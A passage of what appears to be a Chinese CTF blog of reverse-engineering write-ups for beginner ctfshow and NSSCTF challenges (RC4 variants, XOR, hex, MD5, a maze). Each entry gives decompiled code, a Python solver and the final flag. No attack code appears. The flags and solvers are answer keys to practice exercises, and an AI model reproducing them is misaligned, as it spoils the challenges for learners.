11.26.18](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 11.26.18.png)</p><p>rc4加密但是不好解密。S盒打乱那部分要重复 99999 次。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">s = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">k = (<span class="string">b"InfinityLoop"</span>*<span class="number">22</span>) [<span class="number">0</span>:<span class="number">256</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> hit_count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99999</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (s[i]+j+k[i])%<span class="number">256</span></span><br><span class="line">        s[i],s[j] = s[j],s[i]</span><br><span class="line"> </span><br><span class="line">answer =[<span class="number">0xA6</span>,<span class="number">0x3D</span>,<span class="number">0x54</span>,<span class="number">0x0B0</span>,<span class="number">0x74</span>,<span class="number">0xCC</span>,<span class="number">0xBD</span>,<span class="number">0x2A</span>,<span class="number">0x4A</span>,<span class="number">0x0DE</span>,<span class="number">0x0BD</span>,<span class="number">0x35</span>,<span class="number">0x0D1</span>,<span class="number">0x1D</span>,<span class="number">0x80</span>,<span class="number">0x32</span>,<span class="number">0x5F</span>,<span class="number">0x64</span>,<span class="number">0x2F</span>,<span class="number">0x0C5</span>,<span class="number">0x0DD</span>,<span class="number">0x11</span>,<span class="number">0x3E</span>,<span class="number">0x95</span>,<span class="number">0x0CC</span>,<span class="number">0x17</span>,<span class="number">0x13</span>,<span class="number">0x0E5</span>,<span class="number">0x5E</span>,<span class="number">0x65</span>,<span class="number">0x0CE</span>,<span class="number">0x42</span>,<span class="number">0x9E</span>,<span class="number">0x47</span>,<span class="number">0x0C8</span>,<span class="number">0x0F3</span>,<span class="number">0x4D</span>,<span class="number">0x8A</span>,<span class="number">0x0A6</span>,<span class="number">0x1F</span>,<span class="number">0x0F0</span>,<span class="number">0x50</span>,<span class="number">0x27</span>,<span class="number">0x0A2</span>,<span class="number">0x28</span>,<span class="number">0x81</span>,<span class="number">0x24</span>,<span class="number">0x0A7</span>,<span class="number">0x0B4</span>,<span class="number">0x90</span>,<span class="number">0x0FC</span>,<span class="number">0x93</span>,<span class="number">0x8A</span>,<span class="number">0x0C1</span>,<span class="number">0x77</span>,<span class="number">0x0D5</span>,<span class="number">0x16</span>,<span class="number">0x1E</span>,<span class="number">0x0FD</span>,<span class="number">0x87</span>,<span class="number">0x0C7</span>,<span class="number">0x0BB</span>,<span class="number">0x0B3</span>,<span class="number">0x0</span>]</span><br><span class="line"> </span><br><span class="line">v10,v11 = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">v14 = s </span><br><span class="line">tab = [<span class="number">0</span>]*<span class="number">63</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>):</span><br><span class="line">    v11 = v11+<span class="number">1</span></span><br><span class="line">    v10 = (v14[v11] + v10)&amp; <span class="number">0xff</span></span><br><span class="line">    v14[v11],v14[v10] = v14[v10],v14[v11]</span><br><span class="line">    tab[j] = v14[(v14[v10]+ v14[v11]) %<span class="number">256</span>]</span><br><span class="line"> </span><br><span class="line">flag = [answer[i]^tab[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><blockquote><p>flag{i_hope_you_didnt_click_the_button_99999__justRE_in_Static}</p></blockquote><hr><blockquote><p>10~11为七夕杯</p></blockquote><h2 id="10-逆向签到"><a href="#10-逆向签到" class="headerlink" title="10 逆向签到"></a>10 逆向签到</h2><p>🚩flag：<code>ctfshow{re_sign_is_easy_}</code></p><p>💡hint：<code>静态分析</code> <code>反编译</code></p><p>分析这个：</p><p>![截屏2025-08-10 11.31.46](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 11.31.46.png)</p><p>用cyberchef分析：</p><blockquote><p>7B776F6873667463h</p><p>5F6E6769735F6572h</p><p>5F797361655F7369h</p><p>7Dh</p></blockquote><p>得到：</p><p><code>ctfshow{re_sign_is_easy_}</code></p><hr><h2 id="11-easy-magic"><a href="#11-easy-magic" class="headerlink" title="11 easy_magic"></a>11 easy_magic</h2><p>🚩flag：<code>ctfshow{7x_flag_is_here}</code></p><p>💡hint：<code>静态分析</code> <code>反编译</code> <code>md5</code></p><p>16进制字符串，md5解密。</p><p>cb4bc1bdc7a7a220b6df7fc49611ab8a</p><p><a href="https://www.somd5.com/">https://www.somd5.com</a></p><p>![截屏2025-08-10 11.46.59](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 11.46.59.png)</p><hr><blockquote><p>以下题目来源nssctf</p></blockquote><h2 id="12-SWPUCTF-2021-新生赛-re1"><a href="#12-SWPUCTF-2021-新生赛-re1" class="headerlink" title="12 [SWPUCTF 2021 新生赛]re1"></a>12 [SWPUCTF 2021 新生赛]re1</h2><p>🚩flag：<code>NSSCTF{easy_reverse}</code></p><p>💡hint：<code>c</code> <code>语言逆向</code> <code>逆向技术</code></p><p>反编译</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">1008</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">1000</span>]; <span class="comment">// [rsp+410h] [rbp+390h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7FCh] [rbp+77Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">"{34sy_r3v3rs3}"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please put your flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, Str1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">665</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( Str1[i] == <span class="number">101</span> )</span><br><span class="line">      Str1[i] = <span class="number">51</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">665</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( Str1[i] == <span class="number">97</span> )</span><br><span class="line">      Str1[i] = <span class="number">52</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong,see again!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are right!"</span>);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    <span class="comment"># 已知加密后的flag</span></span><br><span class="line">    encrypted_flag = <span class="string">"{34sy_r3v3rs3}"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逆向替换：'3'-&gt;'e'，'4'-&gt;'a'</span></span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encrypted_flag:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">'3'</span>:</span><br><span class="line">            decrypted.append(<span class="string">'e'</span>)</span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">'4'</span>:</span><br><span class="line">            decrypted.append(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试解密</span></span><br><span class="line">original_flag = decrypt_flag()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"原始flag应该是:"</span>, original_flag)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="13-SWPUCTF-2021-新生赛-简简单单的逻辑"><a href="#13-SWPUCTF-2021-新生赛-简简单单的逻辑" class="headerlink" title="13 [SWPUCTF 2021 新生赛]简简单单的逻辑"></a>13 [SWPUCTF 2021 新生赛]简简单单的逻辑</h2><p>🚩flag：<code>NSSCTF{EZEZ_RERE}</code></p><p>💡hint：<code>Python</code> <code>XOR</code> <code>算法分析</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">flag = <span class="string">'xxxxxxxxxxxxxxxxxx'</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    result += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(flag[i])^key))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    <span class="comment"># 已知数据</span></span><br><span class="line">    encrypted_hex = <span class="string">"bcfba4d0038d48bd4b00f82796d393dfec"</span></span><br><span class="line">    key_list = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将十六进制字符串分割为每两个字符一组</span></span><br><span class="line">    encrypted_bytes = [<span class="built_in">int</span>(encrypted_hex[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_hex), <span class="number">2</span>)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算每个key</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> key_list:</span><br><span class="line">        key = (num &gt;&gt; <span class="number">4</span>) + ((num &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">        keys.append(key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 逆向计算原始flag</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        <span class="comment"># 异或操作是可逆的：A ^ B = C ⇒ A = B ^ C</span></span><br><span class="line">        original_char = <span class="built_in">chr</span>(encrypted_bytes[i] ^ keys[i])</span><br><span class="line">        flag += original_char</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取并打印flag</span></span><br><span class="line">flag = decrypt_flag()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的flag:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="14-SWPUCTF-2021-新生赛-简简单单的解"><a href="#14-SWPUCTF-2021-新生赛-简简单单的解" class="headerlink" title="14 [SWPUCTF 2021 新生赛]简简单单的解"></a>14 [SWPUCTF 2021 新生赛]简简单单的解</h2><p>🚩flag：<code>NSSCTF{REAL_EZ_RC4}</code></p><p>💡hint：<code>Python</code> <code>RC4</code> <code>语言逆向</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,urllib.parse</span><br><span class="line">key = <span class="string">"HereIsFlagggg"</span></span><br><span class="line">flag = <span class="string">"xxxxxxxxxxxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line">s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">res = []</span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> flag:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">    k = s_box[t]</span><br><span class="line">    res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">cipher = <span class="string">""</span>.join(res)</span><br><span class="line">crypt = (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)), <span class="string">'utf-8'</span>))</span><br><span class="line">enc = <span class="built_in">str</span>(base64.b64decode(crypt),<span class="string">'utf-8'</span>)</span><br><span class="line">enc = urllib.parse.quote(enc)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment"># enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, urllib.parse</span><br><span class="line"></span><br><span class="line">enc = <span class="string">"%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA"</span></span><br><span class="line">key = <span class="string">"HereIsFlagggg"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        k = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. url 解码</span></span><br><span class="line">    url_decoded = urllib.parse.unquote(enc)</span><br><span class="line">    <span class="comment"># 2. base64先编码，再解码，相当于啥也没干，不管他</span></span><br><span class="line">    <span class="comment"># 3. rc4解码和编码的算法一样,复制粘贴就行了</span></span><br><span class="line">    key = <span class="string">"HereIsFlagggg"</span></span><br><span class="line">    flag = rc4_decrypt(url_decoded, key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="15-SWPUCTF-2021-新生赛-非常简单的逻辑题"><a href="#15-SWPUCTF-2021-新生赛-非常简单的逻辑题" class="headerlink" title="15 [SWPUCTF 2021 新生赛]非常简单的逻辑题"></a>15 [SWPUCTF 2021 新生赛]非常简单的逻辑题</h2><p>🚩flag：<code>NSSCTF{Fake_RERE_QAQ}</code></p><p>💡hint：<code>Python</code> <code>逆向技术</code> <code>语言逆向</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">flag = <span class="string">'xxxxxxxxxxxxxxxxxxxxx'</span></span><br><span class="line">s = <span class="string">'wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    s1 = <span class="built_in">ord</span>(flag[i])//<span class="number">17</span></span><br><span class="line">    s2 = <span class="built_in">ord</span>(flag[i])%<span class="number">17</span></span><br><span class="line">    result += s[(s1+i)%<span class="number">34</span>]+s[-(s2+i+<span class="number">1</span>)%<span class="number">34</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result = 'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">encrypted_result</span>):</span><br><span class="line">    s = <span class="string">'wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;'</span></span><br><span class="line">    flag = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将加密结果分成两个字符一组</span></span><br><span class="line">    pairs = [encrypted_result[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_result), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">        <span class="comment"># 获取两个加密字符</span></span><br><span class="line">        c1, c2 = pair[<span class="number">0</span>], pair[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 找到第一个字符在s中的位置</span></span><br><span class="line">        pos1 = s.index(c1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算s1</span></span><br><span class="line">        <span class="comment"># 因为 pos1 = (s1 + i) % 34</span></span><br><span class="line">        <span class="comment"># 所以 s1 = (pos1 - i) % 34</span></span><br><span class="line">        s1 = (pos1 - i) % <span class="number">34</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 找到第二个字符在s中的位置（从末尾计算）</span></span><br><span class="line">        <span class="comment"># s[-(s2 + i + 1) % 34] = c2</span></span><br><span class="line">        <span class="comment"># 所以 -(s2 + i + 1) % 34 = s.index(c2) - len(s)</span></span><br><span class="line">        <span class="comment"># 但更简单的方法是遍历所有可能的s2</span></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> s2_candidate <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">            <span class="keyword">if</span> s[-(s2_candidate + i + <span class="number">1</span>) % <span class="number">34</span>] == c2:</span><br><span class="line">                s2 = s2_candidate</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"无法解密第<span class="subst">{i}</span>个字符对: <span class="subst">{pair}</span>"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算原始ASCII码</span></span><br><span class="line">        original_char = <span class="built_in">chr</span>(s1 * <span class="number">17</span> + s2)</span><br><span class="line">        flag.append(original_char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数据</span></span><br><span class="line">encrypted_result = <span class="string">'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">flag = decrypt_flag(encrypted_result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的flag:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="16-SWPUCTF-2021-新生赛-老鼠走迷宫"><a href="#16-SWPUCTF-2021-新生赛-老鼠走迷宫" class="headerlink" title="16 [SWPUCTF 2021 新生赛]老鼠走迷宫"></a>16 [SWPUCTF 2021 新生赛]老鼠走迷宫</h2><p>🚩flag：<code>NSSCTF{69193150b15c87d39252d974bc323217}</code></p><p>💡hint：<code>Python</code> <code>逆向</code> <code>DFS</code></p><p>下载是一个没有后缀的附件，通过010打开，看到4d 5a判断是.exe文件。</p><p>使用ida pro打开，看到字符串很多py前缀推测是.pyc文件。</p><p>使用pyinstxtractor解析</p><p>然后反编译获得源码：</p><figure class="highlight py"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7.0 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.9.12 (tags/v3.9.12:b28265d, Mar 23 2022, 23:52:46) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 5.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line"><span class="keyword">import</span> random, msvcrt</span><br><span class="line">row, col = (<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line">i, j = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">maze = [</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, 